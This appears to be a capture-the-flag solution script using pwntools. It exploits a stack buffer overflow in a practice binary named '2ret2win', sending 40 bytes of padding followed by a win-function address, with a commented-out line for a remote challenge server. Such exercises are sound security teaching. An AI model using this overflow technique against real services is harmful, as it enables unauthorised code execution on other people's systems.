from pwn import *
p=process("./2ret2win")
# p=remote("103.47.224.217", 2003)
e=ELF("./2ret2win")
pay=b"A"*40 #padding
pay+=p64(0x0000000000401166) #win function
p.sendline(pay)
p.interactive()

